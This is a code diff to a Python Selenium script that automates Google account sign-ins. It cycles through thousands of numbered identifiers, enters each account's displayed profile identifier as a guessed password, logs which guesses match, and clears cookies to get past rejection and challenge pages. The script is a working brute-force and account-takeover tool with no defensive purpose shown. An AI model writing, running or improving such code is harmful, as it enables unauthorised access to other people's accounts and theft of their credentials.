@@ -30,7 +30,8 @@ os.path.dirname(os.path.abspath(__file__))
 keyboard = Controller()
 # keyboard.type(str(258956856))
 
-
+def numbercheck(number):
+    pass
 def main(account_data, postinfo, packages_id, body_mail):
     # work start time
     starttime = datetime.now().strftime("%H:%M:%S")
@@ -63,8 +64,12 @@ def main(account_data, postinfo, packages_id, body_mail):
     count = 0
     
 
-    for no in range(int(account_data['extra']), int(account_data['extra'])+1000):
-        # time.sleep(0.2)
+    for no in range(int(account_data['extra']), int(account_data['extra'])+5000):
+        
+        # print('check: {0}'.format(no))
+        
+        
+        # print(b.current_url())
 
         # rejeted
         # https://accounts.google.com/signin/v2/deniedsigninrejected
@@ -73,71 +78,50 @@ def main(account_data, postinfo, packages_id, body_mail):
         # password page
         # https://accounts.google.com/signin/v2/challenge/pwd
         count = count+1
-        print(count)
+        # print(count)
         if count % 20 == 1:
-            number = no
-            if account_data['extra'][0:1]==0:
-                number = '0'+str(no)
+        
                 
-            worker_acc.update_account(data="0"+str(number), id=account_data['id'])
-            b.get_url(loginurl)
-        if 'signinrejecte' in b.current_url():
-
-            b.get_url(loginurl)
-        if 'myaccount' in b.current_url():
-            b.driver.delete_all_cookies()
-            
-
-            b.get_url(loginurl)
-        if 'challenge/dp' in b.current_url():
-            b.driver.delete_all_cookies()
-            
-
-            b.get_url(loginurl)
-        if 'signinchooser' in b.current_url():
-            b.driver.delete_all_cookies()
-            
-
-            b.get_url(loginurl)
+            worker_acc.update_account(data=str(no), id=account_data['id'])
+            # b.get_url(loginurl)
+        
+        
         
 
         if 'challenge/pwd' in b.current_url():
-            oldNumber = str(no-1)
-            if account_data['extra'][0:1]==0:
-                oldNumber = '0'+str(no-1)
-            print(oldNumber)
-            worker_acc.save_account(data=oldNumber, soft_token=account_data['password'])
+            
             #<input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value="">
             password = b.visibil_element('xpath','//input[@name="Passwd"]',wait=120)
+            mailpass = b.visibil_element('xpath','//div[@data-profile-identifier]',wait=120)
+            mailpass = ''.join(e for e in mailpass.text if e.isalnum())
 
-            mailpass = oldNumber
+            # print(mailpass)
             password.clear()
-            if account_data['extra'][0:1]:
-                password.send_keys(0)
+            # if account_data['extra'][0:1]:
+                # password.send_keys(0)
             password.send_keys(mailpass)
 
             passwordNext = b.visibil_element(
                 'css', '[id="passwordNext"] button')
 
+            
             passwordNext.click()
-            time.sleep(3)
-            if b.visibil_element('xpath','//input[@name="Passwd"]',wait=10):
-                # print('pssword not match')
+            time.sleep(1)
+            
+            if b.visibil_element('xpath','//*[@width="16px"][@height="16px"]',wait=10):
+                worker_acc.save_account(data=mailpass, soft_token=account_data['password'])
+                print('not match: {0}'.format(mailpass))
+                
                 b.get_url(loginurl)
                 continue
             else:
-                print('pssword matched')
-                if account_data['extra'][0:1]:
-                    fullaccount= "pssword 0"+str(oldNumber)
-                else:
-                    fullaccount= str(oldNumber)
+                print('match: {0}'.format(mailpass))
                     
                     
                 
                 
-                worker_acc.save_account(
-                    data=fullaccount, soft_token=account_data['password'])
-                worker_acc.update_account(data="0"+str(oldNumber), id=account_data['id'])
+                worker_acc.save_account(data= "password: "+mailpass, soft_token=account_data['password'])
+                worker_acc.update_account(data=str(no), id=account_data['id'])
                 b.driver.delete_all_cookies()
                 b.get_url(loginurl)
                 continue
@@ -159,20 +143,40 @@ def main(account_data, postinfo, packages_id, body_mail):
             # b.get_url(loginurl)
             # continue
 
+        if 'signinrejecte' in b.current_url():
+
+            b.get_url(loginurl)
+        if 'myaccount' in b.current_url():
+            b.driver.delete_all_cookies()
+            
+
+            b.get_url(loginurl)
+        if 'challenge/dp' in b.current_url():
+            b.driver.delete_all_cookies()
+            
+
+            b.get_url(loginurl)
+        if 'signinchooser' in b.current_url():
+            b.driver.delete_all_cookies()
+            
+
+            b.get_url(loginurl)
+        if 'unknownerror' in b.current_url():
+            b.driver.delete_all_cookies()
+            
+
+            b.get_url(loginurl)
         if 'identifier' in b.current_url():
             # print('identifier')
 
             # time.sleep(60)
             try:
 
-                number = b.visibil_element('name', "identifier")
-                number.clear()
-
-                print(account_data['extra'][0:1])
-                if account_data['extra'][0:1]:
-                    number.send_keys(0)
+                email = b.visibil_element('name', "identifier")
+                email.clear()
+                email.send_keys(account_data['email'])
                 
-                number.send_keys(no)
+                email.send_keys(no)
             except:
                 b.get_url(loginurl)
                 continue
@@ -182,6 +186,7 @@ def main(account_data, postinfo, packages_id, body_mail):
         
         try:
             nextpage.click()
+            b.driver.implicitly_wait(25)
         except:
             continue
 
